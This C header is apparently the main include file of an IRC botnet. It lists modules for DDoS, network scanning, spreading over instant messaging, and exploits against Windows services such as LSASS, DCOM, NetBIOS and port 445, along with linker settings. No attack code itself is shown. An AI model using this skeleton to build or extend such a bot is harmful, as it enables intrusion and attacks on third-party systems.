#define _WIN32_WINNT 0x0403
#define WIN32_LEAN_AND_MEAN
#ifndef _DEBUG
#pragma optimize("gsy", on)
#pragma comment(linker,"/ALIGN:4096 /IGNORE:4108 /RELEASE /IGNORE:4089")
#pragma comment(linker,"/STUB:stub.exe") 
#else
#pragma comment(linker,"/NODEFAULTLIB:MSVCRTD")
#endif
//kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib  kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib 

#include <winsock2.h>
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
//#include <stdarg.h>

#include <malloc.h>
#include <wininet.h>
#include <windns.h>
#include <iphlpapi.h>
#include <lm.h>
#include <lmat.h>
#include <io.h>
#include <fcntl.h>
#include <tchar.h>
#include <tlhelp32.h>
#include <shlwapi.h>//PathRemoveFileSpec()
#include <list>
#include <sqlext.h>
#include <ntsecapi.h>


#include <sys\types.h> // for filesize function
#include <sys\stat.h>  // ^

#include "defines.h"


#include "Psapi.h"


#include "crypt.h"
#include "secure.h"
#include "loaddlls.h"
#include "reptile.h"
#include "utility.h"
#include "irc.h"
#include "protocol.h"
#include "threads.h"
#include "advscan.h"
#include "externs.h"
#include "service.h"
#include "netutils.h"
#include "processes.h"
#include "regcontrol.h"
#include "commands.h"
#include "socks4.h"
#include "info.h"
#include "download.h"
#include "ddos.h"
#include "lsass.h"
#include "netbios.h"
#include "ftpd.h"
#include "fphost.h"
#include "dcom.h"
#include "wkssvc.h"
#include "netdde.h"
#include "asn.h"
#include "pnp445.h"
#include "aimspread.h"
#include "exploit.h"